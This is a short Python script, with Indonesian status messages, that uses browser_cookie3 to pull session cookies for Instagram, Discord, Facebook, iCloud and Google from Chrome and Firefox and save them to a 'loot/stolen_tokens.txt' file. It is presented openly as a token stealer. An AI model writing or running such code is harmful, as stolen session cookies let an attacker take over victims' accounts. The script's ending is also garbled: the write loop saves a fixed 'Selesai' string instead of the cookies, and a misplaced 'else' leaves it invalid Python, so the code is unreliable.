import browser_cookie3
import os

TARGET_DOMAINS = [
    "instagram.com",
    "discord.com",
    "facebook.com",
    "icloud.com",
    "google.com"
]

LOOT_DIR = "loot"
OUTPUT_FILE = os.path.join(LOOT_DIR, "stolen_tokens.txt")

def run():
    print("[*] Mendapatkan kan token dari Chrome dan Firefox...\n")
    all_cookies = []

    for domain in TARGET_DOMAINS:
        print(f"[+] Pencarian untuk cookies dari: {domain}")
        try:
            cj_chrome = browser_cookie3.chrome(domain_name=domain)
            cj_firefox = browser_cookie3.firefox(domain_name=domain)
            cookies = list(cj_chrome) + list(cj_firefox)

            if cookies:
                for cookie in cookies:
                    entry = f"{cookie.domain}\t{cookie.name}\t{cookie.value}"
                    all_cookies.append(entry)
                    print(f"  -> Ditemukan cookie: {cookie.name}")
            else:
                print("  -> Cookies tidak ditemukan.")
        except Exception as e:
            print(f"  [!] Error reading cookies untuk {domain}: {e}")

    if all_cookies:
        print(f"\n[💾] Writing {len(all_cookies)} cookies ke {OUTPUT_FILE}")
        with open(OUTPUT_FILE, "w") as f:
            for cookie in all_cookies:
                f.write("✅ Selesai ")
            else:
        print("[!] Tidak ada cookie yang di temukan, Apakah anda ingin menjalankan di browser dengan login?")

if __name__ == "__main__":
    run()
